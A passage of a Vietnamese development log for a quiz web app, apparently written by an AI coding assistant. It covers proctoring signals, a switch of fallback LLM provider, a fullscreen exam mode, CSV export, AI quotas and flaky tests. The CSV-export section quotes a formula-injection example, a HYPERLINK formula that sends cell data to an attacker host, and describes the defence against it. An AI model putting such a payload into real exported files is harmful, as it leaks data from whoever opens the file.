rời chỉ có một nửa cặp. Người tra cứu ở tab khác thì phải về *trước khi hết giờ* mới trả lời được, nên cả hai
nửa cùng một số câu. Khuôn không cần biết họ đi đâu; nó chỉ phân biệt *đi rồi về kịp trả lời* với *đi và mất
câu đó*.

### Ba test phủ định xanh RỖNG — và chỉ lộ ra vì ba test dương cùng lúc đỏ

Lần chạy test tích hợp đầu tiên: 3 đỏ (không nhận được cờ), 3 xanh (không có cờ — đúng như mong đợi). Nhưng ba
cái xanh đang xanh **vì cùng một lý do khiến ba cái kia đỏ**: cờ chưa bao giờ được sinh ra.

Nguyên nhân thật: **Spring xử lý message STOMP trên một bể luồng** (`clientInboundChannel`), nên hai frame gửi
cách nhau vài milli-giây **không** có thứ tự đảm bảo — kể cả khi cùng một session. Cả bốn tín hiệu bị xử lý sau
lệnh `next` của host nên cùng mang một số câu.

Lần sửa đầu em chờ `ANSWER_RESULT` quay về làm điểm đồng bộ. **Vẫn đỏ** — vì nó cũng chỉ là một message khác
trên đúng bể luồng đó. Điểm đồng bộ duy nhất đáng tin là **trạng thái đã ghi**: đọc
`GET /rooms/{code}/proctoring` cho tới khi thấy đúng số liệu, rồi mới chuyển câu.

Hai thứ giữ lại từ chuyện này:
- Mỗi test phủ định giờ kèm một **đối chứng dương**. Test "một câu thì không gắn cờ" khẳng định luôn
  `soLanRoiTrang = 4` và `soCauLap = 1` — chứng minh tín hiệu *đã* ghi đủ rồi hệ thống mới **chủ động** không
  gắn cờ. Thiếu nó thì test vẫn xanh khi cả đường ghi bị hỏng.
- Test "host tự chuyển tab" khẳng định bảng tổng kết **rỗng**, không chỉ "không có cờ" — để phân biệt *bỏ tín
  hiệu ngay từ đầu* với *ghi rồi mới lọc khi hiển thị*.

Một lần đỏ mà nếu bỏ qua thì đã có 6 test vô nghĩa nằm trong báo cáo.

### Quyền của host: chỉ nhắc, và đó là quyết định chứ không phải chưa kịp làm

Đề xuất ban đầu của người hướng dẫn có *trừ điểm* và *kick*. Sau khi cân, chốt là **chỉ nhắc riêng**, và test
`ProctoringFlagPanel` khẳng định trên màn hình **chỉ có đúng một nút** — để lần sau không ai "bổ sung cho đủ".

Lý do: ở màn rà soát sau bài thi, giáo viên có *thời gian* — đọc chuỗi tín hiệu, cân nhắc hoàn cảnh, hỏi lại
học sinh, và quyết định lùi lại được. Giữa phòng đấu thì host có ba giây, đang lo điều hành, trên một tín hiệu
client vẫn chặn được và giả mạo được. Một thông báo bật lên → cờ đỏ → người chơi bị loại khỏi cuộc thi tính
điểm, không hoàn tác, không được nói gì. Nhắc thì đủ để người định gian lận biết mình đang bị thấy.

### Một cái bẫy nhỏ về tên người chơi

`RoomParticipant.displayName()` là **null với thành viên đã đăng nhập** — tên của họ nằm ở trạng thái phòng từ
lúc vào nên frame STOMP không mang theo nữa. Lấy thẳng từ participant thì bản tổng kết **mất tên đúng những
người có tài khoản**, còn khách vẫn có tên: lỗi chỉ lộ một nửa, và nửa lộ ra lại là nửa ít ai kiểm. Tên phải
lấy từ `RoomState`.

### Ghi chú báo cáo

- **Mục 2.2 / 2.6:** đây là ví dụ tốt cho *ràng buộc kỹ thuật buộc phải đổi thiết kế* — một câu trong bản chốt
  không sống được khi gặp schema thật, và cách xử lý là sửa cả tài liệu lẫn code cho khớp thay vì lách.
- **"Khó khăn & cách giải quyết":** ba mục — (1) khoá ngoại `NOT NULL` chặn đường tái dùng bảng cũ; (2) bể
  luồng STOMP làm mất thứ tự message khiến test rung; (3) ba test phủ định xanh rỗng.
- **Mục 3.4:** minh hoạ rõ nhất trong cả dự án về **đối chứng dương cho test phủ định**. Con số "6 test mới"
  không nói được gì; chuyện 3 trong 6 cái từng xanh vì lý do sai thì nói được nhiều.
- **Mục 3.5:** phần này thêm 2 loại sự kiện vào phòng đấu nhưng **không đo lại load test** — tín hiệu rời trang
  thưa hơn lượt trả lời vài bậc, và số liệu 08/08 đã chỉ ra nghẽn nằm ở đường *nhận đáp án*. Không có số mới
  thì không ghi số mới.
- **Bốn trụ cột:** đây là chỗ **real-time và chống gian lận gặp nhau** — trước lát cắt này hai phần chạy song
  song mà không biết nhau.

---

### Món phụ: một test trên `main` đỏ vì nó kiểm sai thứ nó nói

Chạy toàn bộ suite thì `NotificationIntegrationTest.shouldNotifyOnLevelUp` đỏ. Kiểm bằng cách stash hết việc
đang làm rồi chạy trên bản gốc: **đỏ y nguyên** — lỗi có sẵn, không do lát cắt này.

Truy ra thì **code đúng, test sai tiền đề**. Cấp 2 cần 100 XP tích luỹ; mỗi bài đúng 100% cho 20 + 15 = 35 XP:

| Sau bài | XP | Thành tích mở được |
|---|---|---|
| 1 | 35 | 🎯 huy hiệu `PERFECT_ATTEMPTS ≥ 1` |
| 2 | 70 | 🌱 huy hiệu `XP ≥ 50` |

Hai bài mới được 70 XP nên **người dùng chưa từng lên cấp 2**. Thông báo mà test đếm là *huy hiệu*, và cái thứ
hai là một huy hiệu **khác mã** nên khoá chống trùng `badge:{mã}` cho qua — hoàn toàn đúng.

Lỗi thật của test: nó lẫn **"chạy lại cùng một sự kiện"** (retry — thứ khoá chống trùng tồn tại để chặn) với
**"làm thêm một bài nữa"** (hành động mới, được phép sinh thành tích mới). Sửa: nộp ba bài cho thật sự lên cấp
2, khẳng định có thông báo khoá `level:2`, rồi **bắn lại đúng sự kiện cũ** và đếm không đổi. Thêm một test nữa
khẳng định điều ngược lại: huy hiệu *khác* thì **phải** có thông báo mới — chống trùng không có nghĩa là "mỗi
người một thông báo thành tích".

Bài học giống hệt chuyện đối chứng dương ở trên: một test xanh/đỏ không nói gì nếu nó không kiểm đúng thứ tên
nó ghi.

---

## 📅 T5 — 20/08/2026 — Đổi nhà cung cấp dự phòng sang Groq, và FR-48

**Mục tiêu:** làm nốt các mục còn hoãn để hoàn thiện web.

**Xong:** đổi provider dự phòng xAI Grok → **Groq** (17 test) · **FR-48 chế độ thi nghiêm ngặt** (V21,
4 test backend + 7 test frontend). Backend 454 → 475, frontend 60 → 67.

---

### Đổi dự phòng sang Groq: sửa một lời hứa chưa bao giờ kiểm được

Người hướng dẫn đề nghị dùng **Groq** thay **Grok**. Hai chữ khác đúng một ký tự nhưng là hai thứ khác
hẳn — Groq (groq.com) là nhà cung cấp hạ tầng suy luận chạy mô hình mở, Grok là mô hình của xAI — nên đã
hỏi lại cho chắc trước khi động vào, vì `CLAUDE.md` ghi rõ *"stack — không tự đổi"*.

Lý do đổi không phải kỹ thuật mà là **kiểm chứng được**. Nhật ký ngày 10/08 đã chốt: *xAI không có gói
miễn phí*, key hợp lệ vẫn trả 403 `permission-denied`. Suốt cả dự án, đường dự phòng **chưa một lần chạy
thật**, và mục 3.6 phải ghi *"chưa demo được fallback"*.

> Một đường dự phòng chưa từng chạy thì không ai biết nó có chạy hay không. Nó là một lời hứa, không phải
> một tính năng — và trong báo cáo nó là một ô trống ở đúng chỗ hội đồng sẽ hỏi.

Groq có gói miễn phí nên lần đầu tiên đo được cả chuỗi bằng số liệu thật.

**Một cái được ngoài dự tính: Groq có streaming.** `GrokProvider` cũ thì không. Nghĩa là trước đây nếu
Gemini chết, trợ lý học tập (features/08) **tắt hẳn** vì `AiOrchestrator.stream()` lọc theo
`supportsStreaming()` và danh sách còn lại rỗng. Giờ chữ vẫn chảy.

**Hai chỗ đọc chuỗi được test riêng** dù nhìn rất vặt, vì cả hai **hỏng trong im lặng**:
- `bocManh` sai → luồng streaming chạy mà không ra chữ nào; người dùng thấy ô trống, không có lỗi để đọc.
- `docRetryAfter` đọc nhầm đơn vị (Groq trả **giây**, không phải mili-giây) → hệ thống chờ 2ms rồi gọi
  lại, đâm vào hạn mức lần nữa; vòng lặp đó nhìn giống *"provider dự phòng vô dụng"*.

**Nhật ký cũ giữ nguyên, không sửa.** Các mục ngày 08/08 và 10/08 ghi đúng sự thật lúc đó; sửa lại thành
"Groq" là làm sai hồ sơ. Chỉ tài liệu **mô tả hệ thống hiện tại** mới đổi: `CLAUDE.md`, `tech-stack.md`,
`architecture.md`, `overview.md`, `database.md`, `roadmap.md`, và ba file nội dung báo cáo.

**Còn nợ:** chưa có `GROQ_API_KEY` nên vẫn **chưa đo được** fallback. Code và tài liệu đã sẵn sàng; thiếu
đúng một key miễn phí. Không được ghi số nào vào mục 3.6 cho tới khi chạy thật.

### FR-48: đặc tả viết "bắt buộc fullscreen", mà trình duyệt không cho bắt buộc

Đây là chỗ dễ hứa quá tay nhất trong cả tính năng 12. Sự thật kỹ thuật:

| Trình duyệt cho | Trình duyệt KHÔNG cho |
|---|---|
| Vào toàn màn hình **từ một cú bấm của người dùng** | Tự vào khi trang mở |
| Biết lúc người dùng thoát ra | Chặn phím Esc |
| Chặn menu chuột phải | Chặn F12 / Ctrl+Shift+I |

Nên tính năng làm ba việc: che đề cho tới khi người học **chủ động** bấm vào toàn màn hình; phát hiện lúc
thoát và nhắc; để lại tín hiệu `FULLSCREEN_EXIT`. Giá trị thật là **biến việc rời bài thi thành có chủ ý và
để lại dấu vết**, không phải dựng một bức tường.

**Ba chỗ trong giao diện đều nói thật về giới hạn đó** — chữ trợ giúp ở form soạn quiz, cảnh báo ở trang
giới thiệu, và cửa vào trước khi làm bài. Nói dối rằng *không thể* thoát là lời hứa mà ai cũng tự phát hiện
sai ngay lần đầu bấm Esc; nguy hiểm hơn là **giáo viên tin vào một rào chắn không tồn tại** rồi bỏ qua việc
rà soát tín hiệu — tức mất đúng thứ có tác dụng thật.

**Ba quyết định giao diện, mỗi cái là một cặp đánh đổi:**

| Quyết định | Vì sao không làm ngược lại |
|---|---|
| **Che đề** ở cửa vào, không chỉ hiện cảnh báo | Dải cảnh báo mà bên dưới vẫn đọc được đề thì chẳng ai bấm nút; chế độ nghiêm ngặt thành dòng chữ trang trí |
| **Thoát giữa chừng thì chỉ nhắc**, không che lại | Che đi là phạt người bấm nhầm Esc bằng cách chặn họ làm tiếp, trong khi tín hiệu đã ghi rồi |
| **Thiết bị không hỗ trợ vẫn cho làm bài** | Safari trên iPhone không có Fullscreen API cho phần tử thường; chặn là biến hạn chế thiết bị thành mất quyền dự thi |

**Luật quan trọng nhất, và là chỗ dễ hỏng nhất:** API trả `strictExam` **đã tính cho từng lượt**
(`quiz.strictExam && mode == EXAM`), không trả cờ thô của quiz. Trả cờ thô thì frontend phải tự nhớ nhân
với chế độ ở **mọi** chỗ dùng, và một chỗ quên là người **luyện tập bị ép toàn màn hình** — vi phạm thẳng
ràng buộc "luyện tập không bị theo dõi". Có test riêng cho đúng tình huống đó: cùng một quiz bật cờ, lượt
EXAM nhận `true`, lượt PRACTICE nhận `false`.

**Một cái bẫy nhỏ ở đường cập nhật:** `QuizRequest.strictExam` dùng `Boolean` bao chứ không phải `boolean`
nguyên thuỷ. Client cũ không gửi trường này thì `null`, và service **giữ nguyên** giá trị đang có. Dùng
kiểu nguyên thuỷ thì mỗi lần một form thiếu trường gọi cập nhật là âm thầm tắt cờ của chủ quiz. Có test
riêng: sửa tiêu đề mà không gửi `strictExam` thì cờ vẫn bật.

### Ghi chú báo cáo

- **Mục 1.x (công nghệ):** phần so sánh nhà cung cấp AI phải sửa — bảng cũ ghi xAI Grok. Lý do đổi là một
  ví dụ tốt cho *ràng buộc thực tế của gói miễn phí ảnh hưởng tới lựa chọn kiến trúc*.
- **Mục 3.6:** vẫn **chưa được ghi số** cho fallback. Có key Groq thì đo ngay: tắt Gemini bằng cách để sai
  key, gọi sinh đề, đo thời gian chuyển và xác nhận kết quả vẫn đúng cấu trúc.
- **"Khó khăn & cách giải quyết":** FR-48 là ví dụ mẫu cho *đặc tả yêu cầu một thứ nền tảng không cho
  phép* — và cách xử lý là làm phần làm được rồi **nói thật về phần không làm được**, thay vì đặt tên
  tính năng nghe như đã làm được.
- **Mục 3.4:** thêm 11 test, trong đó test "lượt luyện tập không bị áp cờ" là loại test giữ một **ràng
  buộc của đặc tả**, không phải giữ một chi tiết kỹ thuật.

---

### FR-58 xuất bảng điểm: hoá ra CSV cũng có "hỏng lặng lẽ"

Lý do hoãn cũ phân biệt rõ: *CSV rẻ, PDF cần thêm thư viện và phải lo font tiếng Việt — một chỗ hỏng lặng
lẽ, chữ ra ô vuông, chỉ phát hiện khi mở file*. Làm CSV thì phát hiện **CSV có đúng ba lỗi cùng loại đó**:
server trả 200, file tải về được, mở được, chỉ nội dung sai.

| Luật | Không làm thì |
|---|---|
| **BOM UTF-8 đầu tệp** | Excel trên Windows không tự đoán UTF-8 cho `.csv`: "Nguyễn" thành "Nguyá»…n" |
| **Thoát theo RFC 4180** | Một dấu phẩy trong tên người đẩy lệch cả hàng, điểm gán sang cột khác |
| **Chặn tiêm công thức** | Tên bắt đầu bằng `=` `+` `-` `@` **chạy như công thức** khi giáo viên mở |

Cái thứ ba là **lỗ hổng bảo mật thật**, không phải chuyện định dạng: tên hiển thị do người dùng tự đặt, nên
một học sinh đặt tên là `=HYPERLINK("http://kẻ-xấu/?d="&A1,"Bấm vào")` thì ô đó chạy trên máy **giáo viên** —
người không làm gì sai. Chặn bằng dấu nháy đơn đứng trước; **bọc ngoặc kép là không đủ**, Excel vẫn diễn
giải công thức bên trong ngoặc kép. Ngoặc kép là luật *định dạng*, không phải luật *an toàn*.

PDF vẫn không làm, ranh giới không đổi.

### FR-84 hạn mức AI: làm phần chặn trước, ô nhập sau

Mục này hoãn từ lát cắt 10 với lý do đáng giữ nguyên: *một ô nhập hạn mức không chặn được gì còn tệ hơn
không có ô nào*, vì quản trị viên sẽ tin rằng chi phí đã bị giới hạn. Nên lần này làm đúng thứ tự — bộ đếm
và điểm chặn trước, ô nhập cuối cùng.

**`null` khác `0`, và cùng con số `0` mang hai nghĩa trái ngược:**

| Giá trị | Nghĩa |
|---|---|
| `null` | Chưa đặt riêng → dùng mặc định hệ thống |
| `0` do quản trị viên đặt | **Cấm** người này gọi AI |
| `0` là mặc định hệ thống | **Chưa bật** hạn mức, không chặn ai |

Phân biệt bằng **nguồn** của con số. Gộp lại thì hoặc không cấm được ai, hoặc mọi tài khoản mới bị cấm ngay
từ lúc tạo — và triệu chứng sẽ là "AI hỏng", rất khó lần ra nguyên nhân.

**Ba quyết định còn lại, mỗi cái tránh một cách hỏng khác nhau:**

- **Đếm ở Redis nhưng dựng lại được từ `ai_request_logs`.** Redis chạy không bật AOF; không dựng lại thì một
  lần restart là xoá hạn mức của cả hệ thống mà không ai nhận ra. Có test riêng chứng minh restart không
  tặng thêm lượt cho ai.
- **Đếm lượt của người dùng, không đếm lần thử lại.** Một lần sinh đề hỏng rồi thử lại 3 lần vẫn là *một*
  lượt; đếm từng lần thử thì hạn mức phụ thuộc vào việc nhà cung cấp hôm nay có ổn định hay không.
- **Lần bị chặn không tính là đã dùng** — không lùi bộ đếm thì con số ở khu quản trị leo mãi và mất nghĩa.

**Nhúng học liệu không tính vào hạn mức:** một tài liệu chia 50 đoạn là 50 lời gọi `embed` cho *một* hành
động; tính vào thì hạn mức 20 lượt hết ngay ở tài liệu đầu tiên.

### Hai lỗi có sẵn moi ra được nhờ chạy full suite

**1. `AiGradingIntegrationTest` đỏ hai lần theo hai kiểu, xanh khi chạy riêng.** Gốc: `reset(aiOrchestrator)`
chạy trong khi luồng chấm nền của phép kiểm *trước* còn đang gọi mock — stub bị xoá giữa chừng, lời gọi trả
null, câu bị đánh `AI_FAILED`. Vá từng test không hết; sửa gốc là **chờ luồng nền lắng xuống rồi mới reset**.

**2. Neo4j deadlock ở `rebuildForUser` — lỗi thật, không phải flake.** Đọc stack thì thấy nó đi qua
`rebuildForUser → syncPublicCatalog`, mà **vòng thử lại deadlock chỉ bọc đường `sync(attemptId)`**. Hai
đường ghi vào *cùng những nút Quiz*, nên chạy song song thì đường không được bọc đổ ra thành lỗi 500 cho
người dùng. Gom vòng thử lại thành một chỗ dùng chung cho cả hai. Thử lại **mỗi quiz riêng**, không bọc cả
vòng lặp: bọc cả vòng thì một deadlock ở quiz thứ 50 làm chạy lại từ quiz đầu — vô ích, và làm tăng đúng
thứ gây deadlock là thời gian giữ khoá.

Bài học lặp lại lần thứ ba trong dự án: **chạy riêng một lớp test không đủ để kết luận nó đúng.**

### Một sai lầm của chính em, ghi lại để không lặp

Chạy `mvnw compile` và sửa mã nguồn **trong lúc `mvnw test` đang chạy nền** — cả ba dùng chung `target/`.
Kết quả: một lượt 14 lỗi `Unable to find a @SpringBootConfiguration` và `NoClassDefFoundError`, không liên
quan gì tới code. Mất một vòng chạy 10 phút để nhận ra. Từ đó làm tuần tự.

### Ghi chú báo cáo

- **Mục 3.4:** hai lỗi ở trên là ví dụ tốt cho *vì sao phải chạy full suite chứ không chỉ chạy lớp vừa sửa*.
  Cái thứ hai đặc biệt đáng kể vì nó là **lỗi sản phẩm**, chỉ lộ ra dưới tải đồng thời.
- **"Khó khăn & cách giải quyết":** FR-58 là ví dụ cho *một tính năng nhìn tưởng tầm thường lại chứa lỗ hổng
  bảo mật* (tiêm công thức CSV). FR-84 là ví dụ cho *thứ tự làm quyết định tính năng có giá trị hay không*.
- **Mục 2.8:** V21 và V22 đều là cột thêm vào bảng có sẵn, và cả hai đều có một quyết định về `null` —
  `strict_exam` mặc định FALSE, `ai_daily_quota` mặc định NULL, vì hai lý do khác nhau.

---

### Có key Groq: đo thật, và ba điều bất ngờ

**1. Model mặc định em chọn đã bị gỡ trước cả khi kịp chạy lần đầu.** Gọi `GET /openai/v1/models` trước
khi đo thì `llama-3.3-70b-versatile` không còn trong danh sách. Đây là lần **thứ ba** dự án dính đúng
chuyện này — sau `text-embedding-004` của Google và `grok-2` của xAI. Không kiểm trước thì cấu hình sẽ
*trông như* đã có đường dự phòng trong khi nó không bao giờ chạy được. Đổi sang `openai/gpt-oss-120b`.

**2. Ép Gemini hỏng bằng key sai thì Groq KHÔNG tiếp quản — và đó là đúng.** Bảng audit ghi rõ:
`gemini | FAILED | HTTP 400`, không có dòng `groq` nào theo sau. `AiOrchestrator` chỉ chuyển nhà cung cấp
khi lỗi **tạm thời** (429, 5xx, mất mạng); key sai là lỗi vĩnh viễn, gửi sang chỗ khác cũng hỏng y hệt.
Đúng bài học đã ghi ngày 10/08 với Grok 403.

Nhưng để phân biệt "đúng thiết kế" với "hỏng" thì phải có test nói rõ ranh giới — và **suốt cả dự án chưa
có test nào cho chính đường chuyển provider**, thứ trung tâm của trụ cột AI. Lý do rất đơn giản và cũng rất
đáng ngại: `GROK_API_KEY` luôn để trống nên provider dự phòng bị lọc ra ngay từ đầu, nghĩa là logic chuyển
**chưa từng được thực thi** — không bởi người dùng, cũng không bởi test. Viết `AiOrchestratorFallbackTest`
6 ca, phủ đúng ranh giới tạm thời / vĩnh viễn / chưa cấu hình / hỏng hết / streaming.

**3. Groq nhanh hơn Gemini khoảng 5 lần trên cùng tác vụ.**

| Nhà cung cấp | Số lượt | Độ trễ TB | Token vào | Token ra |
|---|---:|---:|---:|---:|
| Gemini `gemini-3.6-flash` | 18 | 10 526 ms | 1 072 | 549 |
| Groq `openai/gpt-oss-120b` | 3 | **2 039 ms** | 658 | 586 |

Sinh đề qua chính ứng dụng: **9/9 câu**, cả 9 qua được bộ kiểm cấu trúc `QuestionJsonParser`, tiếng Việt
đúng dấu. Nhưng phải nói rõ để không ai đọc quá: Groq mới 3 lượt, và độ trễ của Gemini gồm cả những lần
chạm hạn mức gói miễn phí phải chờ. Đây là **so sánh chỉ báo**, không phải phép đo hiệu năng có kiểm soát.

**Phát biểu đúng cho báo cáo:** *nhà cung cấp dự phòng đã phục vụ thật qua ứng dụng, và logic chuyển đã
được kiểm bằng test; còn một lần chuyển thật do lỗi tạm thời của Gemini thì chưa quan sát được* — muốn ép
phải chặn mạng ở mức hệ điều hành vì Gemini hardcode base URL.

---

### Chạy thật trên server lộ ra một lỗi mà 500 test không bắt được

Kiểm 13 điểm của FR-48/58/84 trên server đang chạy. Mười hai điểm xanh; điểm thứ mười ba đỏ:
**người bị cấm gọi AI vẫn nhận `202 Accepted`** thay vì 429.

Nguyên nhân là một thứ chỉ lộ ra khi ghép các tầng lại: tác vụ AI nặng **chạy nền**. Endpoint trả `jobId`
ngay, còn lời gọi mô hình xảy ra sau ở luồng nền — nơi duy nhất có chốt hạn mức. Test tích hợp của FR-84
gọi thẳng `AiQuotaService` nên không thấy; test của tầng job không biết gì về hạn mức.

**Kiểm lại trước khi kết luận:** bảng audit cho thấy **0 lời gọi mô hình** sau lúc cấm, và job FAILED đúng
thông báo hạn mức. Nghĩa là mục đích chính — khống chế chi phí — vẫn nguyên vẹn. Lỗi nằm ở *phản hồi cho
người dùng*, không ở *hiệu lực của hạn mức*. Phân biệt được hai chuyện đó quyết định mức độ nghiêm trọng.

**Cách sửa và cái bẫy trong đó:** thêm chốt ở lúc nhận việc. Nhưng chốt mới phải **chỉ kiểm, không cộng
lượt** — cộng ở cả hai chỗ là trừ đôi, và người dùng mất một nửa hạn mức mà không có cách nào biết. Tách
`kiemTra()` khỏi `kiemTraVaGhiNhan()`, dùng chung một hàm riêng quyết định "hạn mức áp cho người này là
bao nhiêu" để hai đường không bao giờ hiểu khác nhau về cùng một con số.

Thêm 4 test, trong đó một test kiểm đúng cái bẫy: gọi `kiemTra()` mười lần rồi khẳng định số lượt đã dùng
vẫn là 0, và vẫn còn đủ hạn mức thật.

> Bài học: **500 test xanh không thay được một lần chạy thật.** Lỗi này nằm ở chỗ nối giữa hai tầng mà mỗi
> tầng đều có test riêng và đều đúng.

---

## 📅 T5 — 20/08/2026 (chiều) — Làm nốt 6 mục còn hoãn: hết mục ⏳

**Xong:** FR-11 ảnh câu hỏi (V23) · FR-36 AI giải thích gợi ý · FR-32 thứ tự thích ứng · FR-12 xuất/nhập
quiz · FR-64 phân hạng · FR-69 email. Backend 514 → **553 test**, frontend 67.

**Không còn mục `⏳` nào.** Sáu mục còn lại đều là *bỏ có lý do* hoặc *làm một phần có lý do*, ghi rõ trong
đặc tả: FR-44 (bỏ), FR-87 (ngoài phạm vi), FR-12/FR-58 (JSON và CSV, không làm PDF), FR-62 (chỉ toàn hệ
thống), FR-70 (bỏ quiet hours).

---

### Hai mục từng hoãn vì "sẽ phải bịa số" — cách gỡ giống nhau

**FR-64 phân hạng.** Lý do hoãn: *"chọn ngưỡng khi chưa có dữ liệu thật thì chỉ là số bịa"*. Đúng — với
ngưỡng **điểm tuyệt đối**. "1000 điểm là Vàng" không dựa trên gì, và sai theo **hai chiều cùng lúc**: mùa ít
người thì không ai đạt, mùa đông người thì ai cũng đạt.

Gỡ bằng **vị trí tương đối**: top 10% Vàng, 25% tiếp theo Bạc. Ngưỡng rút ra từ phân bố thật của mùa ấy —
thứ luôn tồn tại. Điểm mấu chốt: hạng 5 trong 10 người là nửa dưới bảng, hạng 5 trong 100 người là top 5%;
ngưỡng tuyệt đối không phân biệt được. Dưới 10 người thì **không phân hạng ai** — "top 10% của 3 người" là
câu vô nghĩa, và trao Vàng cho người đứng đầu trong ba người làm mất giá đúng huy hiệu đó ở mùa đông.

**FR-36 giải thích gợi ý.** Lý do hoãn: *"tốn hạn mức AI cho mỗi lần mở trang"*. Lý do đó **gắt hơn** sau khi
làm FR-84 sáng cùng ngày: giờ nó tiêu vào hạn mức của **chính người học**, tức họ bị phạt vì một tính năng
họ không chủ động dùng. Gỡ bằng: lý do dạng mẫu luôn có sẵn (không tốn gì), AI chỉ chạy khi **bấm hỏi**, và
cache 24 giờ.

### FR-32: đặc tả nói "adaptive difficulty", nhưng cách hiểu thông thường phá nhiều thứ

Chọn một *tập câu khác nhau* cho từng người thì hai người có **điểm không so được** — mà bảng xếp hạng theo
quiz, bảng theo dõi lớp và thống kê quiz đều dựa trên giả định ngược lại. Nó cũng phá bất biến *"chốt đề lúc
bắt đầu"*.

Nên: **đổi thứ tự, không đổi bộ đề**, và chỉ ở chế độ luyện tập. Mọi câu vẫn được hỏi.

**Lỗi tự bắt được trong code của mình:** chú thích viết *"theo thứ tự người học đã làm"* nhưng code chỉ lọc
danh sách, tức giữ **thứ tự đề**. Vì chính thuật toán đã đổi thứ tự ở các bước trước nên hai thứ đó khác
nhau — chuỗi đọc ra sai hoàn toàn. Có test dựng riêng ví dụ mà hai cách đọc cho **hai hướng ngược nhau**.

### FR-12: chọn định dạng theo hình dạng dữ liệu, không theo thói quen

Đặc tả ghi "JSON/CSV". Quiz là dữ liệu **lồng nhau** nên chỉ làm JSON; bảng điểm lớp (FR-58) vốn **phẳng**
nên dùng CSV. Cùng một đặc tả, hai lựa chọn ngược nhau, vì hai hình dạng dữ liệu khác nhau.

File là **nội dung đề**, không phải bản sao một dòng CSDL: không id (nhập vào máy khác sẽ ghi đè nhầm quiz
người khác), không thống kê (quiz mới "có 500 lượt học" mà chưa ai làm), không ảnh (trỏ vào `uploads/` máy cũ).

### FR-11: chỗ dễ hỏng không phải phần lưu mà là phần hiển thị

Lưu ảnh xong mà DTO không mang theo thì ảnh nằm trong CSDL và **người học không bao giờ thấy** — cả tính năng
vô nghĩa. Nên thêm `imageUrl` vào cả `AttemptQuestionResponse` lẫn `LiveQuestionView`. Phòng đấu để ảnh thấp
hơn (`max-h-56`): nó tính điểm theo **tốc độ**, nên đẩy nút đáp án xuống dưới màn hình là trực tiếp lấy mất
điểm của người chơi màn hình nhỏ.

Tách `UploadedImagePath` dùng chung với ảnh bìa quiz, vì *"chỉ nhận ảnh của hệ thống này"* là **luật an
toàn**: nhân đôi nó nghĩa là lần sau ai đó nới ở một chỗ mà quên chỗ kia, và **chỗ bị quên chính là lỗ hổng**.

### FR-69: em hỏi thừa một câu

Trước khi làm, em hỏi xin thêm `spring-boot-starter-mail` vào stack — vì lý do hoãn trong đặc tả nói ba thứ
cần thiết "không có trong tech-stack.md". **Sai**: thư viện đó cùng toàn bộ `spring.mail` và `app.mail.from`
đã nằm trong dự án từ features/01 cho OTP đặt lại mật khẩu. Đáng lẽ phải mở `pom.xml` ra xem trước khi hỏi.

Hệ quả trực tiếp: suýt khai thư viện đó **lần thứ hai**, và Maven cảnh báo `duplicate declaration`. Bản đầu
cũng lấy `spring.mail.host` làm dấu hiệu bật/tắt — mà host **có giá trị mặc định**, nên tính năng sẽ luôn
"đang bật" và hệ thống cố gửi thư ngay lần chạy đầu, đúng thứ "mặc định tắt" muốn tránh. Dấu hiệu đúng là
**tài khoản gửi**.

Test dùng **SMTP thật trong bộ nhớ**, không mock: mock chỉ chứng minh code gọi đúng hàm, vẫn xanh khi thư
thiếu người nhận hay sai mã hoá tiếng Việt. Phải **giải mã quoted-printable** mới so được chuỗi — và chính
điều đó chứng minh charset khai báo đúng.

### Ba flake nữa, và một bài học lặp lại

| Flake | Gốc |
|---|---|
| `ChatIntegrationTest` (lần thứ **năm**) | `HttpClient` gộp kết nối keep-alive, mà luồng SSE kết thúc bằng việc **server** đóng stream — kết nối chết nằm lại trong bể, lần gửi sau nhận EOF. Lần trước đổi WebClient sang JDK client chỉ **đổi triệu chứng**. Không đặt được `Connection: close` (JDK cấm), nên dựng client mới mỗi lần gọi |
| `IntegrityIntegrationTest` | So `occurred_at <= now()` tức so **đồng hồ JVM** với **đồng hồ trong container** — lệch 276ms đo được trên máy này |
| `RecommendationIntegrationTest` | Đồng bộ nền từ `takeQuiz()` mang ảnh chụp cũ, về đích **sau** lần sync tường minh |

Cả ba đều **xanh khi chạy riêng**. Bài học lặp lại lần thứ tư: *chạy riêng một lớp test không đủ để kết luận
nó đúng*.

**Và một sai lầm của chính em:** `mvnw test` sau vài lần chạy có lọc `-Dtest=` để lại lớp tổng hợp cũ trong
`target/classes` → `NoClassDefFoundError` ở những lớp không liên quan. Mất hai vòng chạy mới nhận ra. Từ đó
luôn `mvnw clean` trước lần chạy đầy đủ.

### Ghi chú báo cáo

- **Mục 2.8:** thêm V23 (`questions.image_url`). V21–V23 đều là cột thêm vào bảng có sẵn, và mỗi cột có một
  quyết định về `null`/mặc định với lý do khác nhau — dùng được làm ví dụ cho phần thiết kế CSDL.
- **"Khó khăn & cách giải quyết":** FR-64 và FR-36 là cặp ví dụ tốt — *cùng một lời phản đối ("sẽ phải bịa
  số" / "sẽ tốn hạn mức"), gỡ được bằng cách đổi cách đặt vấn đề chứ không bằng cách làm bừa*.
- **Mục 3.4:** ba flake ở trên đều là *lỗi của phép kiểm, không phải của sản phẩm* — nhưng cái thứ ba lộ ra
  một tính chất thật của hệ thống (đồ thị gợi ý là view, nhất quán cuối cùng) nên đáng viết vào báo cáo.

---

## 📅 T5 — 20/08/2026 (tối) — Đánh bóng phần người dùng thấy, và một lựa chọn bị bỏ qua trong im lặng

**Xong:** số **người** đã học dưới thẻ quiz · sửa hồ sơ + đổi ảnh đại diện · chân trang · hover thẻ quiz ·
**đăng ký bằng Google nhận đúng vai trò**. Backend 553 → **571 test**, frontend 67.

Hôm nay không thêm chức năng mới nào trong đặc tả. Toàn bộ đến từ việc **người dùng mở web ra bấm** — và hai
trong số đó là lỗi thật mà 553 bài test không hề chạm tới.

---

### "Thêm số lượt làm và lượt đánh giá" — nhận một nửa, từ chối một nửa

Yêu cầu ban đầu là hai con số. Em làm **một**.

**Lượt đánh giá thì không có gì để hiển thị**: hệ thống chưa có bảng đánh giá, chưa có màn chấm sao, chưa có
một dòng dữ liệu nào. Muốn thẻ quiz có "4.7 sao (243 đánh giá)" thì chỉ còn cách sinh số — đúng thứ CLAUDE.md §5
cấm. Và ở đây nó tệ hơn "làm đẹp giao diện": điểm đánh giá là thứ người học **dựa vào để chọn học cái gì**,
nên số bịa không phải trang trí sai, nó là **lời khuyên sai**.

**Số lượt làm thì có thật** — nhưng em đổi sang đếm **người**, không đếm **lượt**. Một người ôn lại quiz 10 lần
sẽ đọc thành "10 người đã học", và tính năng luyện tập lặp của chính dự án (flashcard SRS, làm lại để lấy điểm
